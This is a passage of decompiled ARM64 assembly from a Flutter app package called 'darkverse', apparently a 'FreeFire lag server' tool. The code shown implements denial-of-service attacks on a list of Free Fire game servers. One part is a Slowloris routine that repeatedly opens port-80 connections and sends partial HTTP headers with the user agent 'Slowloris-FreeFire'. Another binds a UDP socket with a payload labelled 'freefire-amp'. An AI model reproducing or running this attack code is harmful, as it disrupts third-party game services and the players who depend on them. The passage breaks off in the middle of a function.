    //     0x87ae68: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bd98] Field <_FreeFireLagServerPageState@829239838.freefireServers>: static late final (offset: 0xd84)
    //     0x87ae6c: ldr             x2, [x2, #0xd98]
    // 0x87ae70: r0 = InitLateFinalStaticField()
    //     0x87ae70: bl              #0xbf5c8c  ; InitLateFinalStaticFieldStub
    // 0x87ae74: r1 = <String>
    //     0x87ae74: ldr             x1, [PP, #0x3e0]  ; [pp+0x3e0] TypeArguments: <String>
    // 0x87ae78: stur            x0, [fp, #-0xb0]
    // 0x87ae7c: r0 = ListIterator()
    //     0x87ae7c: bl              #0x49a80c  ; AllocateListIteratorStub -> ListIterator<X0> (size=0x24)
    // 0x87ae80: mov             x3, x0
    // 0x87ae84: ldur            x2, [fp, #-0xb0]
    // 0x87ae88: stur            x3, [fp, #-0xd0]
    // 0x87ae8c: StoreField: r3->field_b = r2
    //     0x87ae8c: stur            w2, [x3, #0xb]
    // 0x87ae90: LoadField: r0 = r2->field_b
    //     0x87ae90: ldur            w0, [x2, #0xb]
    // 0x87ae94: r4 = LoadInt32Instr(r0)
    //     0x87ae94: sbfx            x4, x0, #1, #0x1f
    // 0x87ae98: stur            x4, [fp, #-0xc8]
    // 0x87ae9c: StoreField: r3->field_f = r4
    //     0x87ae9c: stur            x4, [x3, #0xf]
    // 0x87aea0: ArrayStore: r3[0] = rZR  ; List_8
    //     0x87aea0: stur            xzr, [x3, #0x17]
    // 0x87aea4: LoadField: r0 = r2->field_b
    //     0x87aea4: ldur            w0, [x2, #0xb]
    // 0x87aea8: r5 = LoadInt32Instr(r0)
    //     0x87aea8: sbfx            x5, x0, #1, #0x1f
    // 0x87aeac: stur            x5, [fp, #-0xc0]
    // 0x87aeb0: LoadField: r6 = r2->field_f
    //     0x87aeb0: ldur            w6, [x2, #0xf]
    // 0x87aeb4: DecompressPointer r6
    //     0x87aeb4: add             x6, x6, HEAP, lsl #32
    // 0x87aeb8: stur            x6, [fp, #-0xb8]
    // 0x87aebc: CheckStackOverflow
    //     0x87aebc: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87aec0: cmp             SP, x16
    //     0x87aec4: b.ls            #0x87b098
    // 0x87aec8: cmp             x4, x5
    // 0x87aecc: b.ne            #0x87b044
    // 0x87aed0: ArrayLoad: r7 = r3[0]  ; List_8
    //     0x87aed0: ldur            x7, [x3, #0x17]
    // 0x87aed4: cmp             x7, x5
    // 0x87aed8: b.ge            #0x87afb0
    // 0x87aedc: mov             x0, x5
    // 0x87aee0: mov             x1, x7
    // 0x87aee4: cmp             x1, x0
    // 0x87aee8: b.hs            #0x87b0a0
    // 0x87aeec: ArrayLoad: r0 = r6[r7]  ; Unknown_4
    //     0x87aeec: add             x16, x6, x7, lsl #2
    //     0x87aef0: ldur            w0, [x16, #0xf]
    // 0x87aef4: DecompressPointer r0
    //     0x87aef4: add             x0, x0, HEAP, lsl #32
    // 0x87aef8: StoreField: r3->field_1f = r0
    //     0x87aef8: stur            w0, [x3, #0x1f]
    //     0x87aefc: ldurb           w16, [x3, #-1]
    //     0x87af00: ldurb           w17, [x0, #-1]
    //     0x87af04: and             x16, x17, x16, lsr #2
    //     0x87af08: tst             x16, HEAP, lsr #32
    //     0x87af0c: b.eq            #0x87af14
    //     0x87af10: bl              #0xbf6274  ; WriteBarrierWrappersStub
    // 0x87af14: add             x0, x7, #1
    // 0x87af18: ArrayStore: r3[0] = r0  ; List_8
    //     0x87af18: stur            x0, [x3, #0x17]
    // 0x87af1c: b               #0x87af3c
    // 0x87af20: sub             SP, fp, #0xe8
    // 0x87af24: ldur            x2, [fp, #-0xb0]
    // 0x87af28: ldur            x3, [fp, #-0xd0]
    // 0x87af2c: ldur            x6, [fp, #-0xb8]
    // 0x87af30: ldur            x4, [fp, #-0xc8]
    // 0x87af34: ldur            x5, [fp, #-0xc0]
    // 0x87af38: b               #0x87aebc
    // 0x87af3c: r0 = LoadStaticField(0x410)
    //     0x87af3c: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87af40: ldr             x0, [x0, #0x820]
    // 0x87af44: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87af48: cmp             w0, w16
    // 0x87af4c: b.ne            #0x87af5c
    // 0x87af50: r2 = anyIPv4
    //     0x87af50: add             x2, PP, #0x37, lsl #12  ; [pp+0x37438] Field <_InternetAddress@16069316.anyIPv4>: static late (offset: 0x410)
    //     0x87af54: ldr             x2, [x2, #0x438]
    // 0x87af58: r0 = InitLateStaticField()
    //     0x87af58: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x87af5c: mov             x1, x0
    // 0x87af60: r0 = bind()
    //     0x87af60: bl              #0x87b0b4  ; [dart:io] _RawDatagramSocket::bind
    // 0x87af64: mov             x1, x0
    // 0x87af68: stur            x1, [fp, #-0xd8]
    // 0x87af6c: r0 = Await()
    //     0x87af6c: bl              #0x4a3d90  ; AwaitStub
    // 0x87af70: r1 = <int>
    //     0x87af70: ldr             x1, [PP, #0xed0]  ; [pp+0xed0] TypeArguments: <int>
    // 0x87af74: r2 = 2048
    //     0x87af74: mov             x2, #0x800
    // 0x87af78: stur            x0, [fp, #-0xd8]
    // 0x87af7c: r0 = AllocateArray()
    //     0x87af7c: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x87af80: stur            x0, [fp, #-0xe0]
    // 0x87af84: r1 = 0
    //     0x87af84: mov             x1, #0
    // 0x87af88: CheckStackOverflow
    //     0x87af88: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87af8c: cmp             SP, x16
    //     0x87af90: b.ls            #0x87b0a4
    // 0x87af94: cmp             x1, #0x400
    // 0x87af98: b.ge            #0x87afd4
    // 0x87af9c: ArrayStore: r0[r1] = rZR  ; Unknown_4
    //     0x87af9c: add             x2, x0, x1, lsl #2
    //     0x87afa0: stur            wzr, [x2, #0xf]
    // 0x87afa4: add             x2, x1, #1
    // 0x87afa8: mov             x1, x2
    // 0x87afac: b               #0x87af88
    // 0x87afb0: mov             x2, x3
    // 0x87afb4: StoreField: r2->field_1f = rNULL
    //     0x87afb4: stur            NULL, [x2, #0x1f]
    // 0x87afb8: ldur            x2, [fp, #-0x98]
    // 0x87afbc: ldur            x3, [fp, #-0xa8]
    // 0x87afc0: ldur            x4, [fp, #-0xa0]
    // 0x87afc4: b               #0x87addc
    // 0x87afc8: StoreField: r3->field_1f = rNULL
    //     0x87afc8: stur            NULL, [x3, #0x1f]
    // 0x87afcc: r0 = Null
    //     0x87afcc: mov             x0, NULL
    // 0x87afd0: r0 = ReturnAsyncNotFuture()
    //     0x87afd0: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x87afd4: ldur            x2, [fp, #-0xd0]
    // 0x87afd8: ldur            x3, [fp, #-0xa8]
    // 0x87afdc: StoreField: r0->field_f = rZR
    //     0x87afdc: stur            wzr, [x0, #0xf]
    // 0x87afe0: r16 = 2
    //     0x87afe0: mov             x16, #2
    // 0x87afe4: StoreField: r0->field_13 = r16
    //     0x87afe4: stur            w16, [x0, #0x13]
    // 0x87afe8: r16 = 2
    //     0x87afe8: mov             x16, #2
    // 0x87afec: ArrayStore: r0[0] = r16  ; List_4
    //     0x87afec: stur            w16, [x0, #0x17]
    // 0x87aff0: StoreField: r0->field_1b = rZR
    //     0x87aff0: stur            wzr, [x0, #0x1b]
    // 0x87aff4: StoreField: r0->field_1f = rZR
    //     0x87aff4: stur            wzr, [x0, #0x1f]
    // 0x87aff8: r16 = 2
    //     0x87aff8: mov             x16, #2
    // 0x87affc: StoreField: r0->field_23 = r16
    //     0x87affc: stur            w16, [x0, #0x23]
    // 0x87b000: CheckStackOverflow
    //     0x87b000: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87b004: cmp             SP, x16
    //     0x87b008: b.ls            #0x87b0ac
    // 0x87b00c: r1 = <int>
    //     0x87b00c: ldr             x1, [PP, #0xed0]  ; [pp+0xed0] TypeArguments: <int>
    // 0x87b010: r0 = CodeUnits()
    //     0x87b010: bl              #0x47a638  ; AllocateCodeUnitsStub -> CodeUnits (size=0x10)
    // 0x87b014: mov             x1, x0
    // 0x87b018: r0 = "freefire-amp"
    //     0x87b018: add             x0, PP, #0x3c, lsl #12  ; [pp+0x3c140] "freefire-amp"
    //     0x87b01c: ldr             x0, [x0, #0x140]
    // 0x87b020: StoreField: r1->field_b = r0
    //     0x87b020: stur            w0, [x1, #0xb]
    // 0x87b024: r0 = UnsupportedError()
    //     0x87b024: bl              #0x45cb3c  ; AllocateUnsupportedErrorStub -> UnsupportedError (size=0x10)
    // 0x87b028: mov             x2, x0
    // 0x87b02c: r1 = "Cannot add to a fixed-length list"
    //     0x87b02c: ldr             x1, [PP, #0x7d18]  ; [pp+0x7d18] "Cannot add to a fixed-length list"
    // 0x87b030: stur            x2, [fp, #-0xe8]
    // 0x87b034: StoreField: r2->field_b = r1
    //     0x87b034: stur            w1, [x2, #0xb]
    // 0x87b038: mov             x0, x2
    // 0x87b03c: r0 = Throw()
    //     0x87b03c: bl              #0xbf5dcc  ; ThrowStub
    // 0x87b040: brk             #0
    // 0x87b044: mov             x0, x2
    // 0x87b048: r0 = ConcurrentModificationError()
    //     0x87b048: bl              #0x4576a0  ; AllocateConcurrentModificationErrorStub -> ConcurrentModificationError (size=0x10)
    // 0x87b04c: mov             x1, x0
    // 0x87b050: ldur            x0, [fp, #-0xb0]
    // 0x87b054: StoreField: r1->field_b = r0
    //     0x87b054: stur            w0, [x1, #0xb]
    // 0x87b058: mov             x0, x1
    // 0x87b05c: r0 = Throw()
    //     0x87b05c: bl              #0xbf5dcc  ; ThrowStub
    // 0x87b060: brk             #0
    // 0x87b064: mov             x0, x2
    // 0x87b068: r0 = ConcurrentModificationError()
    //     0x87b068: bl              #0x4576a0  ; AllocateConcurrentModificationErrorStub -> ConcurrentModificationError (size=0x10)
    // 0x87b06c: mov             x1, x0
    // 0x87b070: ldur            x0, [fp, #-0x98]
    // 0x87b074: StoreField: r1->field_b = r0
    //     0x87b074: stur            w0, [x1, #0xb]
    // 0x87b078: mov             x0, x1
    // 0x87b07c: r0 = Throw()
    //     0x87b07c: bl              #0xbf5dcc  ; ThrowStub
    // 0x87b080: brk             #0
    // 0x87b084: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87b084: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87b088: b               #0x87ad80
    // 0x87b08c: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87b08c: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87b090: b               #0x87ade8
    // 0x87b094: r0 = RangeErrorSharedWithoutFPURegs()
    //     0x87b094: bl              #0xbf8204  ; RangeErrorSharedWithoutFPURegsStub
    // 0x87b098: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87b098: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87b09c: b               #0x87aec8
    // 0x87b0a0: r0 = RangeErrorSharedWithoutFPURegs()
    //     0x87b0a0: bl              #0xbf8204  ; RangeErrorSharedWithoutFPURegsStub
    // 0x87b0a4: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87b0a4: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87b0a8: b               #0x87af94
    // 0x87b0ac: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87b0ac: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87b0b0: b               #0x87b00c
  }
  static void _startSlowloris() {
    // ** addr: 0x87bbdc, size: 0xf0
    // 0x87bbdc: EnterFrame
    //     0x87bbdc: stp             fp, lr, [SP, #-0x10]!
    //     0x87bbe0: mov             fp, SP
    // 0x87bbe4: AllocStack(0x18)
    //     0x87bbe4: sub             SP, SP, #0x18
    // 0x87bbe8: CheckStackOverflow
    //     0x87bbe8: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87bbec: cmp             SP, x16
    //     0x87bbf0: b.ls            #0x87bcc4
    // 0x87bbf4: r1 = Function '<anonymous closure>': static.
    //     0x87bbf4: add             x1, PP, #0x3c, lsl #12  ; [pp+0x3c148] AnonymousClosure: static (0x87bccc), in [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startSlowloris (0x87bbdc)
    //     0x87bbf8: ldr             x1, [x1, #0x148]
    // 0x87bbfc: r2 = Null
    //     0x87bbfc: mov             x2, NULL
    // 0x87bc00: r0 = AllocateClosure()
    //     0x87bc00: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x87bc04: mov             x3, x0
    // 0x87bc08: r1 = Null
    //     0x87bc08: mov             x1, NULL
    // 0x87bc0c: r2 = Instance_Duration
    //     0x87bc0c: add             x2, PP, #0x10, lsl #12  ; [pp+0x10e58] Obj!Duration@a440f1
    //     0x87bc10: ldr             x2, [x2, #0xe58]
    // 0x87bc14: r0 = Timer.periodic()
    //     0x87bc14: bl              #0x570930  ; [dart:async] Timer::Timer.periodic
    // 0x87bc18: stur            x0, [fp, #-8]
    // 0x87bc1c: r0 = LoadStaticField(0xd74)
    //     0x87bc1c: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87bc20: ldr             x0, [x0, #0x1ae8]
    // 0x87bc24: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87bc28: cmp             w0, w16
    // 0x87bc2c: b.ne            #0x87bc3c
    // 0x87bc30: r2 = _timers
    //     0x87bc30: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be60] Field <_FreeFireLagServerPageState@829239838._timers@829239838>: static late (offset: 0xd74)
    //     0x87bc34: ldr             x2, [x2, #0xe60]
    // 0x87bc38: r0 = InitLateStaticField()
    //     0x87bc38: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x87bc3c: stur            x0, [fp, #-0x18]
    // 0x87bc40: LoadField: r1 = r0->field_b
    //     0x87bc40: ldur            w1, [x0, #0xb]
    // 0x87bc44: LoadField: r2 = r0->field_f
    //     0x87bc44: ldur            w2, [x0, #0xf]
    // 0x87bc48: DecompressPointer r2
    //     0x87bc48: add             x2, x2, HEAP, lsl #32
    // 0x87bc4c: LoadField: r3 = r2->field_b
    //     0x87bc4c: ldur            w3, [x2, #0xb]
    // 0x87bc50: r2 = LoadInt32Instr(r1)
    //     0x87bc50: sbfx            x2, x1, #1, #0x1f
    // 0x87bc54: stur            x2, [fp, #-0x10]
    // 0x87bc58: r1 = LoadInt32Instr(r3)
    //     0x87bc58: sbfx            x1, x3, #1, #0x1f
    // 0x87bc5c: cmp             x2, x1
    // 0x87bc60: b.ne            #0x87bc6c
    // 0x87bc64: mov             x1, x0
    // 0x87bc68: r0 = _growToNextCapacity()
    //     0x87bc68: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x87bc6c: ldur            x2, [fp, #-0x18]
    // 0x87bc70: ldur            x3, [fp, #-0x10]
    // 0x87bc74: add             x4, x3, #1
    // 0x87bc78: lsl             x5, x4, #1
    // 0x87bc7c: StoreField: r2->field_b = r5
    //     0x87bc7c: stur            w5, [x2, #0xb]
    // 0x87bc80: LoadField: r1 = r2->field_f
    //     0x87bc80: ldur            w1, [x2, #0xf]
    // 0x87bc84: DecompressPointer r1
    //     0x87bc84: add             x1, x1, HEAP, lsl #32
    // 0x87bc88: ldur            x0, [fp, #-8]
    // 0x87bc8c: ArrayStore: r1[r3] = r0  ; List_4
    //     0x87bc8c: add             x25, x1, x3, lsl #2
    //     0x87bc90: add             x25, x25, #0xf
    //     0x87bc94: str             w0, [x25]
    //     0x87bc98: tbz             w0, #0, #0x87bcb4
    //     0x87bc9c: ldurb           w16, [x1, #-1]
    //     0x87bca0: ldurb           w17, [x0, #-1]
    //     0x87bca4: and             x16, x17, x16, lsr #2
    //     0x87bca8: tst             x16, HEAP, lsr #32
    //     0x87bcac: b.eq            #0x87bcb4
    //     0x87bcb0: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x87bcb4: r0 = Null
    //     0x87bcb4: mov             x0, NULL
    // 0x87bcb8: LeaveFrame
    //     0x87bcb8: mov             SP, fp
    //     0x87bcbc: ldp             fp, lr, [SP], #0x10
    // 0x87bcc0: ret
    //     0x87bcc0: ret             
    // 0x87bcc4: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87bcc4: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87bcc8: b               #0x87bbf4
  }
  [closure] static Future<void> <anonymous closure>(dynamic, Timer) async {
    // ** addr: 0x87bccc, size: 0x43c
    // 0x87bccc: EnterFrame
    //     0x87bccc: stp             fp, lr, [SP, #-0x10]!
    //     0x87bcd0: mov             fp, SP
    // 0x87bcd4: AllocStack(0xd8)
    //     0x87bcd4: sub             SP, SP, #0xd8
    // 0x87bcd8: SetupParameters(dynamic _ /* r1 */)
    //     0x87bcd8: stur            NULL, [fp, #-8]
    //     0x87bcdc: mov             x0, #0
    //     0x87bce0: add             x1, fp, w0, sxtw #2
    //     0x87bce4: ldr             x1, [x1, #0x18]
    //     0x87bce8: ldur            w2, [x1, #0x17]
    //     0x87bcec: add             x2, x2, HEAP, lsl #32
    //     0x87bcf0: stur            x2, [fp, #-0x78]
    // 0x87bcf4: CheckStackOverflow
    //     0x87bcf4: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87bcf8: cmp             SP, x16
    //     0x87bcfc: b.ls            #0x87c0f4
    // 0x87bd00: InitAsync() -> Future<void?>
    //     0x87bd00: ldr             x0, [PP, #0x360]  ; [pp+0x360] TypeArguments: <void?>
    //     0x87bd04: bl              #0x4a3fd4  ; InitAsyncStub
    // 0x87bd08: r0 = LoadStaticField(0xd6c)
    //     0x87bd08: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87bd0c: ldr             x0, [x0, #0x1ad8]
    // 0x87bd10: tbz             w0, #4, #0x87bd1c
    // 0x87bd14: r0 = Null
    //     0x87bd14: mov             x0, NULL
    // 0x87bd18: r0 = ReturnAsyncNotFuture()
    //     0x87bd18: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x87bd1c: r0 = LoadStaticField(0xd84)
    //     0x87bd1c: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87bd20: ldr             x0, [x0, #0x1b08]
    // 0x87bd24: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87bd28: cmp             w0, w16
    // 0x87bd2c: b.ne            #0x87bd3c
    // 0x87bd30: r2 = freefireServers
    //     0x87bd30: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bd98] Field <_FreeFireLagServerPageState@829239838.freefireServers>: static late final (offset: 0xd84)
    //     0x87bd34: ldr             x2, [x2, #0xd98]
    // 0x87bd38: r0 = InitLateFinalStaticField()
    //     0x87bd38: bl              #0xbf5c8c  ; InitLateFinalStaticFieldStub
    // 0x87bd3c: r1 = <String>
    //     0x87bd3c: ldr             x1, [PP, #0x3e0]  ; [pp+0x3e0] TypeArguments: <String>
    // 0x87bd40: stur            x0, [fp, #-0x80]
    // 0x87bd44: r0 = ListIterator()
    //     0x87bd44: bl              #0x49a80c  ; AllocateListIteratorStub -> ListIterator<X0> (size=0x24)
    // 0x87bd48: mov             x3, x0
    // 0x87bd4c: ldur            x2, [fp, #-0x80]
    // 0x87bd50: stur            x3, [fp, #-0x98]
    // 0x87bd54: StoreField: r3->field_b = r2
    //     0x87bd54: stur            w2, [x3, #0xb]
    // 0x87bd58: LoadField: r0 = r2->field_b
    //     0x87bd58: ldur            w0, [x2, #0xb]
    // 0x87bd5c: r4 = LoadInt32Instr(r0)
    //     0x87bd5c: sbfx            x4, x0, #1, #0x1f
    // 0x87bd60: stur            x4, [fp, #-0x90]
    // 0x87bd64: StoreField: r3->field_f = r4
    //     0x87bd64: stur            x4, [x3, #0xf]
    // 0x87bd68: ArrayStore: r3[0] = rZR  ; List_8
    //     0x87bd68: stur            xzr, [x3, #0x17]
    // 0x87bd6c: ldur            x5, [fp, #-0x78]
    // 0x87bd70: CheckStackOverflow
    //     0x87bd70: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87bd74: cmp             SP, x16
    //     0x87bd78: b.ls            #0x87c0fc
    // 0x87bd7c: LoadField: r0 = r2->field_b
    //     0x87bd7c: ldur            w0, [x2, #0xb]
    // 0x87bd80: r1 = LoadInt32Instr(r0)
    //     0x87bd80: sbfx            x1, x0, #1, #0x1f
    // 0x87bd84: cmp             x4, x1
    // 0x87bd88: b.ne            #0x87c0d4
    // 0x87bd8c: ArrayLoad: r6 = r3[0]  ; List_8
    //     0x87bd8c: ldur            x6, [x3, #0x17]
    // 0x87bd90: cmp             x6, x1
    // 0x87bd94: b.ge            #0x87c0c4
    // 0x87bd98: mov             x0, x1
    // 0x87bd9c: mov             x1, x6
    // 0x87bda0: cmp             x1, x0
    // 0x87bda4: b.hs            #0x87c104
    // 0x87bda8: LoadField: r0 = r2->field_f
    //     0x87bda8: ldur            w0, [x2, #0xf]
    // 0x87bdac: DecompressPointer r0
    //     0x87bdac: add             x0, x0, HEAP, lsl #32
    // 0x87bdb0: ArrayLoad: r1 = r0[r6]  ; Unknown_4
    //     0x87bdb0: add             x16, x0, x6, lsl #2
    //     0x87bdb4: ldur            w1, [x16, #0xf]
    // 0x87bdb8: DecompressPointer r1
    //     0x87bdb8: add             x1, x1, HEAP, lsl #32
    // 0x87bdbc: mov             x0, x1
    // 0x87bdc0: stur            x1, [fp, #-0x88]
    // 0x87bdc4: StoreField: r3->field_1f = r0
    //     0x87bdc4: stur            w0, [x3, #0x1f]
    //     0x87bdc8: ldurb           w16, [x3, #-1]
    //     0x87bdcc: ldurb           w17, [x0, #-1]
    //     0x87bdd0: and             x16, x17, x16, lsr #2
    //     0x87bdd4: tst             x16, HEAP, lsr #32
    //     0x87bdd8: b.eq            #0x87bde0
    //     0x87bddc: bl              #0xbf6274  ; WriteBarrierWrappersStub
    // 0x87bde0: add             x0, x6, #1
    // 0x87bde4: ArrayStore: r3[0] = r0  ; List_8
    //     0x87bde4: stur            x0, [x3, #0x17]
    // 0x87bde8: r1 = 1
    //     0x87bde8: mov             x1, #1
    // 0x87bdec: r0 = AllocateContext()
    //     0x87bdec: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x87bdf0: mov             x1, x0
    // 0x87bdf4: ldur            x0, [fp, #-0x78]
    // 0x87bdf8: stur            x1, [fp, #-0xa0]
    // 0x87bdfc: StoreField: r1->field_b = r0
    //     0x87bdfc: stur            w0, [x1, #0xb]
    // 0x87be00: r0 = current()
    //     0x87be00: bl              #0x46ef0c  ; [dart:io] IOOverrides::current
    // 0x87be04: ldur            x1, [fp, #-0x88]
    // 0x87be08: r2 = 80
    //     0x87be08: mov             x2, #0x50
    // 0x87be0c: r3 = Instance_Duration
    //     0x87be0c: add             x3, PP, #0x15, lsl #12  ; [pp+0x15308] Obj!Duration@a44231
    //     0x87be10: ldr             x3, [x3, #0x308]
    // 0x87be14: r0 = _connect()
    //     0x87be14: bl              #0x78128c  ; [dart:io] Socket::_connect
    // 0x87be18: mov             x1, x0
    // 0x87be1c: stur            x1, [fp, #-0xa8]
    // 0x87be20: r0 = Await()
    //     0x87be20: bl              #0x4a3d90  ; AwaitStub
    // 0x87be24: mov             x1, x0
    // 0x87be28: ldur            x2, [fp, #-0xa0]
    // 0x87be2c: stur            x1, [fp, #-0xa8]
    // 0x87be30: StoreField: r2->field_f = r0
    //     0x87be30: stur            w0, [x2, #0xf]
    //     0x87be34: tbz             w0, #0, #0x87be50
    //     0x87be38: ldurb           w16, [x2, #-1]
    //     0x87be3c: ldurb           w17, [x0, #-1]
    //     0x87be40: and             x16, x17, x16, lsr #2
    //     0x87be44: tst             x16, HEAP, lsr #32
    //     0x87be48: b.eq            #0x87be50
    //     0x87be4c: bl              #0xbf6254  ; WriteBarrierWrappersStub
    // 0x87be50: r0 = LoadStaticField(0xd80)
    //     0x87be50: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87be54: ldr             x0, [x0, #0x1b00]
    // 0x87be58: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87be5c: cmp             w0, w16
    // 0x87be60: b.ne            #0x87be70
    // 0x87be64: r2 = _tcpSockets
    //     0x87be64: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be78] Field <_FreeFireLagServerPageState@829239838._tcpSockets@829239838>: static late (offset: 0xd80)
    //     0x87be68: ldr             x2, [x2, #0xe78]
    // 0x87be6c: r0 = InitLateStaticField()
    //     0x87be6c: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x87be70: stur            x0, [fp, #-0xc0]
    // 0x87be74: LoadField: r2 = r0->field_b
    //     0x87be74: ldur            w2, [x0, #0xb]
    // 0x87be78: stur            x2, [fp, #-0xb8]
    // 0x87be7c: LoadField: r1 = r0->field_f
    //     0x87be7c: ldur            w1, [x0, #0xf]
    // 0x87be80: DecompressPointer r1
    //     0x87be80: add             x1, x1, HEAP, lsl #32
    // 0x87be84: LoadField: r3 = r1->field_b
    //     0x87be84: ldur            w3, [x1, #0xb]
    // 0x87be88: r4 = LoadInt32Instr(r2)
    //     0x87be88: sbfx            x4, x2, #1, #0x1f
    // 0x87be8c: stur            x4, [fp, #-0xb0]
    // 0x87be90: r1 = LoadInt32Instr(r3)
    //     0x87be90: sbfx            x1, x3, #1, #0x1f
    // 0x87be94: cmp             x4, x1
    // 0x87be98: b.ne            #0x87bea4
    // 0x87be9c: mov             x1, x0
    // 0x87bea0: r0 = _growToNextCapacity()
    //     0x87bea0: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x87bea4: ldur            x3, [fp, #-0xa8]
    // 0x87bea8: ldur            x0, [fp, #-0xc0]
    // 0x87beac: ldur            x2, [fp, #-0xb0]
    // 0x87beb0: ldur            x4, [fp, #-0x88]
    // 0x87beb4: add             x1, x2, #1
    // 0x87beb8: lsl             x5, x1, #1
    // 0x87bebc: StoreField: r0->field_b = r5
    //     0x87bebc: stur            w5, [x0, #0xb]
    // 0x87bec0: LoadField: r1 = r0->field_f
    //     0x87bec0: ldur            w1, [x0, #0xf]
    // 0x87bec4: DecompressPointer r1
    //     0x87bec4: add             x1, x1, HEAP, lsl #32
    // 0x87bec8: mov             x0, x3
    // 0x87becc: ArrayStore: r1[r2] = r0  ; List_4
    //     0x87becc: add             x25, x1, x2, lsl #2
    //     0x87bed0: add             x25, x25, #0xf
    //     0x87bed4: str             w0, [x25]
    //     0x87bed8: tbz             w0, #0, #0x87bef4
    //     0x87bedc: ldurb           w16, [x1, #-1]
    //     0x87bee0: ldurb           w17, [x0, #-1]
    //     0x87bee4: and             x16, x17, x16, lsr #2
    //     0x87bee8: tst             x16, HEAP, lsr #32
    //     0x87beec: b.eq            #0x87bef4
    //     0x87bef0: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x87bef4: r0 = LoadClassIdInstr(r3)
    //     0x87bef4: ldur            x0, [x3, #-1]
    //     0x87bef8: ubfx            x0, x0, #0xc, #0x14
    // 0x87befc: mov             x1, x3
    // 0x87bf00: r2 = "GET / HTTP/1.1\r\n"
    //     0x87bf00: add             x2, PP, #0x3c, lsl #12  ; [pp+0x3c150] "GET / HTTP/1.1\r\n"
    //     0x87bf04: ldr             x2, [x2, #0x150]
    // 0x87bf08: r0 = GDT[cid_x0 + -0xedf]()
    //     0x87bf08: sub             lr, x0, #0xedf
    //     0x87bf0c: ldr             lr, [x21, lr, lsl #3]
    //     0x87bf10: blr             lr
    // 0x87bf14: r1 = Null
    //     0x87bf14: mov             x1, NULL
    // 0x87bf18: r2 = 6
    //     0x87bf18: mov             x2, #6
    // 0x87bf1c: r0 = AllocateArray()
    //     0x87bf1c: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x87bf20: r16 = "Host: "
    //     0x87bf20: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c158] "Host: "
    //     0x87bf24: ldr             x16, [x16, #0x158]
    // 0x87bf28: StoreField: r0->field_f = r16
    //     0x87bf28: stur            w16, [x0, #0xf]
    // 0x87bf2c: ldur            x1, [fp, #-0x88]
    // 0x87bf30: StoreField: r0->field_13 = r1
    //     0x87bf30: stur            w1, [x0, #0x13]
    // 0x87bf34: r16 = "\r\n"
    //     0x87bf34: add             x16, PP, #0x11, lsl #12  ; [pp+0x11258] "\r\n"
    //     0x87bf38: ldr             x16, [x16, #0x258]
    // 0x87bf3c: ArrayStore: r0[0] = r16  ; List_4
    //     0x87bf3c: stur            w16, [x0, #0x17]
    // 0x87bf40: str             x0, [SP]
    // 0x87bf44: r0 = _interpolate()
    //     0x87bf44: bl              #0x45bb80  ; [dart:core] _StringBase::_interpolate
    // 0x87bf48: ldur            x3, [fp, #-0xa8]
    // 0x87bf4c: r1 = LoadClassIdInstr(r3)
    //     0x87bf4c: ldur            x1, [x3, #-1]
    //     0x87bf50: ubfx            x1, x1, #0xc, #0x14
    // 0x87bf54: mov             x2, x0
    // 0x87bf58: mov             x0, x1
    // 0x87bf5c: mov             x1, x3
    // 0x87bf60: r0 = GDT[cid_x0 + -0xedf]()
    //     0x87bf60: sub             lr, x0, #0xedf
    //     0x87bf64: ldr             lr, [x21, lr, lsl #3]
    //     0x87bf68: blr             lr
    // 0x87bf6c: ldur            x3, [fp, #-0xa8]
    // 0x87bf70: r0 = LoadClassIdInstr(r3)
    //     0x87bf70: ldur            x0, [x3, #-1]
    //     0x87bf74: ubfx            x0, x0, #0xc, #0x14
    // 0x87bf78: mov             x1, x3
    // 0x87bf7c: r2 = "User-Agent: Slowloris-FreeFire\r\n"
